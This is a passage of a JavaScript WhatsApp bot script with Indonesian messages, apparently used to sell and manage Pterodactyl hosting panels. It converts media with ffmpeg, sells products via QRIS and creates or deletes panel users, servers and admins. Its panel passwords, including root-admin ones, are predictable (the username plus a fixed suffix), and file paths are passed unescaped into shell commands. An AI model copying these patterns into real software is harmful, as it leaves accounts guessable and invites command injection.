                await sock.sendContact(m.chat, [global.owner], global.namaOwner, "Developer Bot", m)
                await m.reply(`Hai kak *${m.pushName}*, ini adalah kontak pembuat script ini cuy`)
            }
                break

            // ** case tools menu **
            case "toimg": case "toimage": {
                if (!qmsg) return reply("Reply sticker yang mau dikonversi!");
                if (!/webp/.test(mime)) return reply(`Balas stiker dengan caption *${prefix + command}*`);

                const mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);
                const outputPath = getRandom(".png");

                exec(`ffmpeg -i ${mediaPath} ${outputPath}`, async (err) => {
                    fs.unlinkSync(mediaPath);
                    if (err) {
                        console.error(err);
                        return reply("Gagal mengonversi stiker ke gambar!");
                    }

                    try {
                        const buffer = fs.readFileSync(outputPath);
                        await sock.sendMessage(
                            m.chat,
                            { image: buffer, caption: "*Berhasil dikonversi ke gambar!*" },
                            { quoted: m }
                        );
                    } catch (e) {
                        console.error(e);
                        reply("Terjadi kesalahan saat mengirim gambar.");
                    } finally {
                        fs.unlinkSync(outputPath);
                    }
                });
            }
                break

            case 'toptt': case 'tovn': case 'tovoicenote': {
                const quoted = m.quoted ? m.quoted : m;
                if (!/audio|video/.test(mime)) {
                    return m.reply(`Reply ke video atau audio yang ingin dijadikan VN!\n\nContoh: *${prefix + command}*`);
                }

                m.reply("Prosess.....");

                let mediaPath = null;
                let outPath = null;

                try {
                    mediaPath = await sock.downloadAndSaveMediaMessage(quoted);
                    if (!mediaPath) return m.reply("Gagal mengunduh media.");

                    outPath = path.join(process.cwd(), 'data', 'trash', `vn_${Date.now()}.ogg`);

                    if (!fs.existsSync(path.dirname(outPath))) fs.mkdirSync(path.dirname(outPath), { recursive: true });

                    await new Promise((resolve, reject) => {
                        exec(`ffmpeg -y -i "${mediaPath}" -vn -c:a libopus -b:a 128k -ac 1 -ar 48000 -map_metadata -1 "${outPath}"`, (err) => {
                            if (err) return reject(err);
                            resolve();
                        });
                    });

                    await sock.sendMessage(m.chat, {
                        audio: { url: outPath },
                        mimetype: "audio/ogg; codecs=opus",
                        ptt: true
                    }, { quoted: m });

                    if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
                    if (fs.existsSync(outPath)) fs.unlinkSync(outPath);

                } catch (err) {
                    console.error(err);
                    if (mediaPath && fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
                    if (outPath && fs.existsSync(outPath)) fs.unlinkSync(outPath);
                    m.reply("❌ Gagal mengonversi ke VN. Pastikan FFmpeg terinstal.");
                }
            }
                break;

            // ** case menu create panel **
            case "addgrupreseller":
            case "addgrupreseller":
            case "addseller": {
                if (!isAn) return reply(mess.owner)
                if (!m.isGroup) return reply(mess.group)
                const input = m.chat
                if (datagc.includes(input))
                    return reply(`Grup ini sudah di beri akses reseller panel!`)
                datagc.push(input)
                await fs.writeFileSync("./data/reseller.json", JSON.stringify(datagc, null, 2))
                reply(`Berhasil menambah grup reseller panel ✅`)
            }
                break

            case "delgrupseller":
            case "delgrupreseller": {
                if (!isAn) return reply(mess.owner)
                if (datagc.length < 1) return reply("Tidak ada grup reseller panel!")
                if (!text && m.isGroup) {
                    if (!datagc.includes(m.chat))
                        return reply("Grup ini bukan grup reseller panel!")

                    datagc.splice(datagc.indexOf(m.chat), 1)
                    fs.writeFileSync("./data/reseller.json", JSON.stringify(datagc, null, 2))
                    return reply("Berhasil menghapus grup reseller panel ✅")
                }

                if (!text)
                    return reply(
                        `Masukkan *nomor list* grup!
      
*Example:*
- ${prefix}delresseler 2
- ${prefix}listresseler (untuk lihat detail)`
                    )

                if (text === "all") {
                    datagc.length = 0
                    fs.writeFileSync("./data/reseller.json", JSON.stringify(datagc, null, 2))
                    return reply("Berhasil menghapus *semua* grup reseller panel ✅")
                }

                let nomor = parseInt(text)
                if (isNaN(nomor))
                    return reply("Masukkan *angka* sesuai nomor di list!")

                let index = nomor - 1
                if (index < 0 || index >= datagc.length)
                    return reply("Nomor tidak valid!")

                let removed = datagc[index]
                datagc.splice(index, 1)
                fs.writeFileSync("./data/reseller.json", JSON.stringify(datagc, null, 2))

                reply(
                    `Berhasil menghapus grup reseller ✅
- ID Groups: *${removed}*`
                )
            }
                break

            case "listgrupseller":
            case "listress": {
                if (!isAn) return reply(mess.owner)
                if (datagc.length < 1) return reply("Tidak ada group reseller di data!")

                let teks = `*List all grup reseller*\n\n`
                let no = 1

                for (let id of datagc) {
                    let name = "Tidak ditemukan"
                    try {
                        let meta = await sock.groupMetadata(id)
                        name = meta.subject || name
                    } catch { }

                    teks += `${no}. *${name}*\n`
                    teks += ` ┣𖣠 Id: \`${id}\`\n\n`
                    no++
                }

                teks += `*Cara hapus:*
- ${prefix}delresseler nomornya
- ${prefix}delresseler langsung di grup`

                await sock.sendMessage(m.chat, { text: teks }, { quoted: m })
            }
                break

            case "1gbv2": case "2gbv2": case "3gbv2": case "4gbv2": case "5gbv2": case "6gbv2": case "7gbv2": case "8gbv2": case "9gbv2": case "10gbv2": case "unlimitedv2": case "unliv2": {
                if (!isAn && !isGrupPrem) return m.reply('Only owner dan grup dengan akses Reseller')
                if (!text) return m.reply(example("username"))
                global.panel = text
                var ram
                var disknya
                var cpu
                if (command == "1gbv2") {
                    ram = "1000"
                    disknya = "1000"
                    cpu = "40"
                } else if (command == "2gbv2") {
                    ram = "2000"
                    disknya = "2000"
                    cpu = "60"
                } else if (command == "3gbv2") {
                    ram = "3000"
                    disknya = "3000"
                    cpu = "80"
                } else if (command == "4gbv2") {
                    ram = "4000"
                    disknya = "4000"
                    cpu = "100"
                } else if (command == "5gbv2") {
                    ram = "5000"
                    disknya = "5000"
                    cpu = "120"
                } else if (command == "6gbv2") {
                    ram = "6000"
                    disknya = "6000"
                    cpu = "140"
                } else if (command == "7gbv2") {
                    ram = "7000"
                    disknya = "7000"
                    cpu = "160"
                } else if (command == "8gbv2") {
                    ram = "8000"
                    disknya = "8000"
                    cpu = "180"
                } else if (command == "9gbv2") {
                    ram = "9000"
                    disknya = "9000"
                    cpu = "200"
                } else if (command == "10gbv2") {
                    ram = "10000"
                    disknya = "10000"
                    cpu = "220"
                } else {
                    ram = "0"
                    disknya = "0"
                    cpu = "0"
                }
                let username = global.panel.toLowerCase()
                let email = username + "@gmail.com"
                let name = capital(username) + " Server"
                let password = username + "990"
                let f = await fetch(domainV2 + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikeyV2
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": username.toLowerCase(),
                        "first_name": name,
                        "last_name": "Server",
                        "language": "en",
                        "password": password
                    })
                })
                let data = await f.json();
                if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
                let user = data.attributes
                let desc = tanggal(Date.now())
                let usr_id = user.id
                let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikeyV2
                    }
                })
                let data2 = await f1.json();
                let startup_cmd = data2.attributes.startup
                let f2 = await fetch(domainV2 + "/api/application/servers", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikeyV2,
                    },
                    "body": JSON.stringify({
                        "name": name,
                        "description": desc,
                        "user": usr_id,
                        "egg": parseInt(eggV2),
                        "docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
                        "startup": startup_cmd,
                        "environment": {
                            "INST": "npm",
                            "USER_UPLOAD": "0",
                            "AUTO_UPDATE": "0",
                            "CMD_RUN": "npm start"
                        },
                        "limits": {
                            "memory": ram,
                            "swap": 0,
                            "disk": disknya,
                            "io": 500,
                            "cpu": cpu
                        },
                        "feature_limits": {
                            "databases": 5,
                            "backups": 5,
                            "allocations": 5
                        },
                        deploy: {
                            locations: [parseInt(locV2)],
                            dedicated_ip: false,
                            port_range: [],
                        },
                    })
                })
                let result = await f2.json()
                if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
                let server = result.attributes
                var orang
                if (m.isGroup) {
                    orang = m.sender
                    await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
                } else {
                    orang = m.chat
                }
                var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0, 2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0, 2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu + "%"}*
* ${global.domainV2}

*Syarat & Ketentuan :*
${global.teksPanel}
`
                await fs.writeFileSync("akunpanel.txt", teks)
                await sock.sendMessage(orang, { document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks }, { quoted: m })
                await fs.unlinkSync("./akunpanel.txt")
                delete global.panel
            }
                break

            case "listpanelv2": case "listpv2": case "listserverv2": {
                if (!isAn) return m.reply(mess.owner)
                if (!global.apikey) return m.reply("Apikey tidak ditemukan!\nPastikan di settings.js *global.apikey* sudah di isi!")
                let page = 1
                let allServers = []
                while (true) {
                    let res = await fetch(`${global.domainV2}/api/application/servers?page=${page}`, {
                        headers: {
                            Accept: "application/json",
                            "Content-Type": "application/json",
                            Authorization: `Bearer ${global.apikeyV2}`
                        }
                    })

                    let data = await res.json()
                    if (!data.data || data.data.length === 0) break

                    allServers.push(...data.data)

                    if (!data.meta?.pagination || page >= data.meta.pagination.total_pages) break
                    page++
                }

                if (!allServers.length) return m.reply("Tidak ada server panel.")

                let teks = `*List all server panel*\n> #Total: *${allServers.length} server*\n\n`
                let no = 1

                for (let srv of allServers) {
                    let s = srv.attributes
                    let uuid = s.uuid.split("-")[0]
                    let status = "unknown"

                    try {
                        let res = await fetch(`${global.domain}/api/client/servers/${uuid}/resources`, {
                            headers: {
                                Accept: "application/json",
                                "Content-Type": "application/json",
                                Authorization: `Bearer ${global.capikey}`
                            }
                        })
                        let json = await res.json()
                        status = json.attributes?.current_state?.toUpperCase() || "unknown"
                    } catch (e) {
                        status = "unknown"
                    }

                    teks += `  ⚪ ID Server : *${s.id}*\n`
                    teks += `  ⚫ ID User : *${s.user}*\n`
                    teks += `  📍 Nama : *${s.name}*\n`
                    teks += `  💾 RAM : *${s.limits.memory == 0 ? "Unlimited" : (s.limits.memory / 1000) + "GB"}*\n`
                    teks += `┣𖣠 Status : *${status}*\n\n`
                }
                return sock.sendMessage(m.chat, { text: teks }, { quoted: m })
            }
                break

            case "delpanelv2":
            case "delpv2": {
                if (!isAn) return m.reply(mess.owner)
                if (global.apikey.length < 1) return m.reply("Apikey tidak ditemukan!\nPastikan di settings.js *global.apikey* sudah di isi!")
                if (!args[0]) return m.reply(example(`id servernya\n\nuntuk melihat id server ketik *${prefix}listpanel*`))

                let f = await fetch(global.domainV2 + "/api/application/servers?page=1", {
                    method: "GET",
                    headers: {
                        Accept: "application/json",
                        "Content-Type": "application/json",
                        Authorization: "Bearer " + global.apikeyV2
                    }
                })
                let result = await f.json()
                let servers = result.data
                let deletedUserId = null
                let deletedServerName = null

                for (let server of servers) {
                    let s = server.attributes
                    if (args[0] == s.id.toString()) {
                        deletedUserId = s.user // <-- ambil user ID dari server
                        deletedServerName = s.name

                        // Hapus server
                        await fetch(global.domainV2 + `/api/application/servers/${s.id}`, {
                            method: "DELETE",
                            headers: {
                                Accept: "application/json",
                                "Content-Type": "application/json",
                                Authorization: "Bearer " + global.apikeyV2
                            }
                        })
                    }
                }
                if (!deletedUserId) return m.reply("*ID Server* Tidak Ditemukan")
                // Hapus user berdasarkan user ID
                await fetch(global.domainV2 + `/api/application/users/${deletedUserId}`, {
                    method: "DELETE",
                    headers: {
                        Accept: "application/json",
                        "Content-Type": "application/json",
                        Authorization: "Bearer " + global.apikeyV2
                    }
                })
                m.reply(`Berhasil Menghapus Akun Panel *${capital(deletedServerName)}* (Server & User)`)
            }
                break

            case "cadminv2": case "cadpv2": {
                if (!isAn) return Reply(mess.owner)
                if (!text) return m.reply(example("username"))
                let username = text.toLowerCase()
                let email = username + "@gmail.com"
                let name = capital(args[0])
                let password = username + "001"
                let f = await fetch(domainV2 + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikeyV2
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": username.toLowerCase(),
                        "first_name": name,
                        "last_name": "Admin",
                        "root_admin": true,
                        "language": "en",
                        "password": password
                    })
                })
                let data = await f.json();
                if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
                let user = data.attributes
                var orang
                if (m.isGroup) {
                    orang = m.sender
                    await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
                } else {
                    orang = m.chat
                }
                var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
* ${global.domainV2}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
                await fs.writeFileSync("./akunpanel.txt", teks)
                await sock.sendMessage(orang, { document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks }, { quoted: m })
                await fs.unlinkSync("./akunpanel.txt")
            }
                break

            case "deladminv2": case "deladpv2": {
                if (!isAn) return m.reply(mess.owner)
                if (!args[0]) return m.reply(example(`id nya\n\nuntuk melihat id admin ketik *${prefix}listadmin*`))
                let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + global.apikeyV2
                    }
                })
                let res2 = await cek.json();
                let users = res2.data;
                let getid = null
                let idadmin = null
                await users.forEach(async (e) => {
                    if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
                        getid = e.attributes.username
                        idadmin = e.attributes.id
                        let delusr = await fetch(global.domainV2 + `/api/application/users/${idadmin}`, {
                            "method": "DELETE",
                            "headers": {
                                "Accept": "application/json",
                                "Content-Type": "application/json",
                                "Authorization": "Bearer " + global.apikeyV2
                            }
                        })
                        let res = delusr.ok ? {
                            errors: null
                        } : await delusr.json()
                    }
                })
                if (idadmin == null) return m.reply("ID Admin Tidak Ditemukan!")
                m.reply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
            }
                break

            case "listadminv2": case "listadpv2": {
                if (!isAn) return m.reply(mess.owner)
                let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + global.apikeyV2
                    }
                })
                let res2 = await cek.json();
                let users = res2.data;
                if (users.length < 1) return m.reply("Tidak Ada Admin Panel")
                var teks = "*List all admin panel*\n\n"
                await users.forEach((i) => {
                    if (i.attributes.root_admin !== true) return
                    teks += `  ⚪ ID User : *${i.attributes.id}*
   📍 Nama : *${i.attributes.first_name}*\n\n`
                })
                m.reply(teks)
            }
                break

            case "clearpanelv2": case "clearserverv2": {
                if (!isAn) return reply(mess.owner)
                await reply(`*Memproses penghapusan semua user & server panel ⚠️*`)
                try {
                    const headers = {
                        "Authorization": "Bearer " + global.apikeyV2,
                        "Content-Type": "application/json",
                        "Accept": "application/json",
                    };

                    async function getUsers() {
                        try {
                            const res = await axios.get(`${global.domainV2}/api/application/users`, { headers });
                            return res.data.data;
                        } catch (error) {
                            reply(JSON.stringify(error.response?.data || error.message, null, 2))
                            return [];
                        }
                    }

                    async function getServers() {
                        try {
                            const res = await axios.get(`${global.domainV2}/api/application/servers`, { headers });
                            return res.data.data;
                        } catch (error) {
                            reply(JSON.stringify(error.response?.data || error.message, null, 2))
                            return [];
                        }
                    }
                    async function deleteServer(serverUUID) {
                        try {
                            await axios.delete(`${global.domainV2}/api/application/servers/${serverUUID}`, { headers });
                            console.log(`Server ${serverUUID} berhasil dihapus.`);
                        } catch (error) {
                            console.error(`Gagal menghapus server ${serverUUID}:`, error.response?.data || error.message);
                        }
                    }
                    async function deleteUser(userID) {
                        try {
                            await axios.delete(`${global.domainV2}/api/application/users/${userID}`, { headers });
                            console.log(`User ${userID} berhasil dihapus.`);
                        } catch (error) {
                            console.error(`Gagal menghapus user ${userID}:`, error.response?.data || error.message);
                        }
                    }
                    async function deleteNonAdminUsersAndServers() {
                        const users = await getUsers();
                        const servers = await getServers();
                        let totalSrv = 0
                        for (const user of users) {
                            if (user.attributes.root_admin) {
                                console.log(`Lewati admin: ${user.attributes.username}`);
                                continue; // Lewati admin
                            }
                            const userID = user.attributes.id;
                            const userEmail = user.attributes.email;
                            console.log(`Menghapus user: ${user.attributes.username} (${userEmail})`);
                            // Cari server yang dimiliki user ini
                            const userServers = servers.filter(srv => srv.attributes.user === userID);
                            // Hapus semua server user ini
                            for (const server of userServers) {
                                await deleteServer(server.attributes.id);
                                totalSrv += 1
                            }
                            // Hapus user setelah semua servernya terhapus
                            await deleteUser(userID);
                        }
                        await reply(`*Finished Cleaning the Panel ✅*

- Total *${totalSrv}* (user & server) panel dihapus 

*⚠️ Server yang dihapus bukan admin panel*`)
                    }
                    // Jalankan fungsi
                    return deleteNonAdminUsersAndServers();
                } catch (err) {
                    return reply(`${JSON.stringify(err, null, 2)}`)
                }
            }
                break

            case "addproduk": {
                if (!isAn) return reply(mess.owner)
                if (!text || !text.includes("|")) return reply(`Format salah!\nGunakan: *${prefix + command} Nama Produk|Harga|Deskripsi*\n\nContoh:\n*${prefix + command}* Panel 1GB|5000|RAM 1GB CPU 30%`)
                let [nama, harga, deskripsi] = text.split("|");
                if (!nama || !harga || !deskripsi) return reply(`Format salah!\nGunakan: *${prefix + command} Nama Produk|Harga|Deskripsi*\n\nContoh:\n*${prefix + command}* Panel 1GB|5000|RAM 1GB CPU 30%`)

                const produkDbFile = './data/produk.json';
                if (!fs.existsSync(produkDbFile)) fs.writeFileSync(produkDbFile, JSON.stringify([]));
                let products = JSON.parse(fs.readFileSync(produkDbFile));

                const nextId = products.length > 0 ? Math.max(...products.map(p => p.id)) + 1 : 1;
                const newProduct = {
                    id: nextId,
                    name: nama.trim(),
                    price: harga.trim(),
                    description: deskripsi.trim()
                };
                products.push(newProduct);
                fs.writeFileSync(produkDbFile, JSON.stringify(products, null, 2));

                await reply(`✅ *PRODUK BERHASIL DITAMBAHKAN*\n\n🆔 *ID:* ${nextId}\n📦 *Nama:* ${newProduct.name}\n💵 *Harga:* ${newProduct.price}\n📝 *Deskripsi:* _${newProduct.description}_`)
            }
                break

            case "delproduk": {
                if (!isAn) return reply(mess.owner)
                if (!text) return reply(`Format salah!\nGunakan: *${prefix + command} ID_PRODUK*\n\nContoh: *${prefix + command} 1*`)
                const targetId = parseInt(text.trim());
                if (isNaN(targetId)) return reply(`ID Produk harus berupa angka!`)

                const produkDbFile = './data/produk.json';
                if (!fs.existsSync(produkDbFile)) return reply(`Belum ada produk yang terdaftar!`)

                let products = JSON.parse(fs.readFileSync(produkDbFile));
                const index = products.findIndex(p => p.id === targetId);
                if (index === -1) return reply(`Produk dengan ID *${targetId}* tidak ditemukan!`)

                const deletedProduct = products.splice(index, 1)[0];
                fs.writeFileSync(produkDbFile, JSON.stringify(products, null, 2));

                await reply(`✅ *PRODUK BERHASIL DIHAPUS*\n\n🆔 *ID:* ${deletedProduct.id}\n📦 *Nama:* ${deletedProduct.name}`)
            }
                break

            case "listproduk": case "produk": {
                const produkDbFile = './data/produk.json';
                if (!fs.existsSync(produkDbFile)) {
                    return reply(`🛍️ *DAFTAR PRODUK JAJAN-BOT*\n\nBelum ada produk yang terdaftar.`)
                }
                let products = JSON.parse(fs.readFileSync(produkDbFile));
                if (products.length === 0) {
                    return reply(`🛍️ *DAFTAR PRODUK JAJAN-BOT*\n\nBelum ada produk yang terdaftar.`)
                }

                let teks = `┌━━━〔 *DAFTAR PRODUK JAJAN-BOT* 〕━━━🛍️\n┃\n`;
                for (let p of products) {
                    teks += `┃ 🆔 *ID:* ${p.id}\n`;
                    teks += `┃ 📦 *Nama:* ${p.name}\n`;
                    teks += `┃ 💵 *Harga:* ${p.price}\n`;
                    teks += `┃ 📝 *Deskripsi:* _${p.description}_\n┃\n`;
                }
                teks += `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n> _Untuk membeli hubungi Owner_`;
                await reply(teks);
            }
                break

            case "buy": case "beli": {
                if (!text) return reply(`Format salah!\nGunakan: *${prefix + command} ID_PRODUK*\n\nContoh: *${prefix + command} 1*`)
                const targetId = parseInt(text.trim());
                if (isNaN(targetId)) return reply(`ID Produk harus berupa angka!`)

                const produkDbFile = './data/produk.json';
                if (!fs.existsSync(produkDbFile)) return reply(`Belum ada produk yang terdaftar!`)

                let products = JSON.parse(fs.readFileSync(produkDbFile));
                const product = products.find(p => p.id === targetId);
                if (!product) return reply(`Produk dengan ID *${targetId}* tidak ditemukan!`)

                if (!global.API_KEY_PAKASIR || !global.PROJECT_SLUG) {
                    return reply(`Pembayaran QRIS belum dikonfigurasi oleh owner!`)
                }

                // Konversi harga ke angka (menghapus karakter non-digit)
                let cleanPrice = parseInt(product.price.replace(/[^0-9]/g, ''));
                if (isNaN(cleanPrice) || cleanPrice <= 0) {
                    return reply(`Harga produk tidak valid untuk diproses sistem pembayaran!`)
                }

                const orderId = "VS-" + randomBytes(3).toString('hex').toUpperCase();

                const payload = {
                    project: global.PROJECT_SLUG,
                    order_id: orderId,
                    amount: cleanPrice,
                    api_key: global.API_KEY_PAKASIR
                };

                await reply(`*Sedang membuat QRIS pembayaran untuk produk ${product.name}... ⏳*`)

                try {
                    const { data } = await axios.post('https://app.pakasir.com/api/transactioncreate/qris', payload, {
                        headers: { 'Content-Type': 'application/json' },
                        timeout: 15000
                    });

                    if (!data?.payment?.payment_number) {
                        throw new Error("Response Pakasir tidak valid atau project salah");
                    }

                    const payment = data.payment;
                    const qrBuffer = await generateQrisCanvas(payment.payment_number, product.name, cleanPrice, payment.total_payment);

                    let caption = `🛒 *INVOICE PEMBELIAN PRODUK*\n\n`;
                    caption += `📋 Order ID : ${orderId}\n`;
                    caption += `📦 Produk   : ${product.name}\n`;
                    caption += `💰 Harga    : Rp ${cleanPrice.toLocaleString('id-ID')}\n`;
                    caption += `💳 Total    : Rp ${payment.total_payment.toLocaleString('id-ID')}\n`;
                    caption += `⏰ Expired  : ${new Date(payment.expired_at * 1000).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n`;
                    caption += `Scan QRIS di atas untuk membayar. Setelah pembayaran lunas, status pembelian akan dikonfirmasi secara otomatis.`;

                    await sock.sendMessage(m.chat, {
                        image: qrBuffer,
                        caption: caption
                    }, { quoted: m });

                    // Simpan transaksi
                    const trxPath = './data/transaksi_pakasir.json';
                    let dbTrx = fs.existsSync(trxPath) ? JSON.parse(fs.readFileSync(trxPath, 'utf8')) : {};

                    dbTrx[orderId] = {
                        sender: m.sender,
                        chat: m.chat,
                        type: 'PRODUK',
                        amount: cleanPrice,
                        status: 'UNPAID',
                        created_at: Date.now(),
                        product_data: {
                            id: product.id,
                            name: product.name,
                            price: cleanPrice,
                            description: product.description
                        }
                    };

                    fs.writeFileSync(trxPath, JSON.stringify(dbTrx, null, 2), 'utf8');

                } catch (err) {
                    let errorMsg = err.message || 'Server Pakasir bermasalah';
                    if (err.response?.data?.error) errorMsg += `\nPesan Pakasir: ${err.response.data.error}`;
                    await reply(`❌ *GAGAL MEMPROSES INVOICE QRIS*\n\n${errorMsg}`);
                }
            }
                break

            case "addserver": case "addsrv": {
                if (!isAn) return m.reply(mess.owner)
                if (!text) return m.reply(example(`id,nama,ram\nKetik: *${prefix}listpanel* untuk melihat id`));
                let [usr_id, nama, ramInput] = text.split(",");
                if (!usr_id || !nama || !ramInput) return m.reply(example(`id,nama,ram\nKetik: *${prefix}listpanel* untuk melihat id`));
                usr_id = usr_id.trim();
                nama = nama.trim();
                ramInput = ramInput.trim().toLowerCase();

                let ram, disknya, cpu;

                if (["unli", "unlimited"].includes(ramInput)) {
                    ram = disknya = cpu = 0;
                } else if (/^\d+gb$/.test(ramInput)) {
                    const gb = parseInt(ramInput.replace("gb", ""));
                    if (gb < 1 || gb > 10) return reply("RAM hanya boleh dari 1GB sampai 10GB atau 'unli'");
                    ram = gb * 1000;
                    disknya = gb * 1000;
                    cpu = 20 + (gb * 20); // contoh: 1gb = 40%, 2gb = 60%, dst
                } else {
                    return reply("Format RAM salah. Gunakan seperti: 1gb - unli");
                }

                const desc = tanggal(Date.now());

                const getEgg = await fetch(`${global.domainV2}/api/application/nests/${nestid}/eggs/${egg}`, {
                    method: "GET",
                    headers: {
                        Accept: "application/json",
                        "Content-Type": "application/json",
                        Authorization: `Bearer ${global.apikeyV2}`
                    }
                });

                const eggData = await getEgg.json();
                const startup_cmd = eggData.attributes.startup;

                const createServer = await fetch(`${global.domainV2}/api/application/servers`, {
                    method: "POST",
                    headers: {
                        Accept: "application/json",
                        "Content-Type": "application/json",
                        Authorization: `Bearer ${global.apikeyV2}`
                    },
                    body: JSON.stringify({
                        name: nama,
                        description: desc,
                        user: parseInt(usr_id),
                        egg: parseInt(egg),
                        docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
                        startup: startup_cmd,
                        environment: {
                            INST: "npm", USER_UPLOAD: "0",
                            AUTO_UPDATE: "0", CMD_RUN: "npm start"
                        },
                        limits: {
                            memory: parseInt(ram),
                            swap: 0,
                            disk: parseInt(disknya),
                            io: 500,
                            cpu: parseInt(cpu)
                        },
                        feature_limits: { databases: 5, backups: 5, allocations: 5 },
                        deploy: {
                            locations: [parseInt(loc)],
                            dedicated_ip: false,
                            port_range: [],
                        },
                    })
                });

                const result = await createServer.json();

                if (result.errors) return reply("Gagal menambah server:\n" + JSON.stringify(result.errors[0], null, 2));
                const server = result.attributes;

                let teks = `*Succes Create New Server ✅*
- User ID : ${usr_id}
- Server ID : ${server.id}
- Nama Server : ${nama}

*Server Specifications 🖥️*
- Ram : ${ram == 0 ? "Unlimited" : `${ram / 1000}GB`}
- Disk : ${disknya == 0 ? "Unlimited" : `${disknya / 1000}GB`}
- CPU : ${cpu == 0 ? "Unlimited" : cpu + "%"}`;

                await sock.sendMessage(m.chat, { text: teks, contextInfo: { isForwarded: true } }, { quoted: m });
            }
                break

            case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
                if (!isAn && !isGrupPrem) return m.reply('Only owner dan grup dengan akses Reseller')
                if (!text) return m.reply(example("username"))
                global.panel = text
                var ram
                var disknya
                var cpu
                if (command == "1gb") {
                    ram = "1000"
                    disknya = "1000"
                    cpu = "40"
                } else if (command == "2gb") {
                    ram = "2000"
                    disknya = "2000"
                    cpu = "60"
                } else if (command == "3gb") {
                    ram = "3000"
                    disknya = "3000"
                    cpu = "80"
                } else if (command == "4gb") {
                    ram = "4000"
                    disknya = "4000"
                    cpu = "100"
                } else if (command == "5gb") {
                    ram = "5000"
                    disknya = "5000"
                    cpu = "120"
                } else if (command == "6gb") {
                    ram = "6000"
                    disknya = "6000"
                    cpu = "140"
                } else if (command == "7gb") {
                    ram = "7000"
                    disknya = "7000"
                    cpu = "160"
                } else if (command == "8gb") {
                    ram = "8000"
                    disknya = "8000"
                    cpu = "180"
                } else if (command == "9gb") {
                    ram = "9000"
                    disknya = "9000"
                    cpu = "200"
                } else if (command == "10gb") {
                    ram = "10000"
                    disknya = "10000"
                    cpu = "220"
                } else {
                    ram = "0"
                    disknya = "0"
                    cpu = "0"
                }
                let username = global.panel.toLowerCase()
                let email = username + "@gmail.com"
                let name = capital(username) + " Server"
                let password = username + "990"
                let f = await fetch(domain + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": username.toLowerCase(),
                        "first_name": name,
                        "last_name": "Server",
                        "language": "en",
                        "password": password
                    })
                })
                let data = await f.json();
                if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
                let user = data.attributes
                let desc = tanggal(Date.now())
                let usr_id = user.id
                let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                })
                let data2 = await f1.json();
                let startup_cmd = data2.attributes.startup
                let f2 = await fetch(domain + "/api/application/servers", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey,
                    },
                    "body": JSON.stringify({
                        "name": name,
                        "description": desc,
                        "user": usr_id,
                        "egg": parseInt(egg),
                        "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
                        "startup": startup_cmd,
                        "environment": {
                            "INST": "npm",
                            "USER_UPLOAD": "0",
                            "AUTO_UPDATE": "0",
                            "CMD_RUN": "npm start"
                        },
                        "limits": {
                            "memory": ram,
                            "swap": 0,
                            "disk": disknya,
                            "io": 500,
                            "cpu": cpu
                        },
                        "feature_limits": {
                            "databases": 5,
                            "backups": 5,
                            "allocations": 5
                        },
                        deploy: {
                            locations: [parseInt(loc)],
                            dedicated_ip: false,
                            port_range: [],
                        },
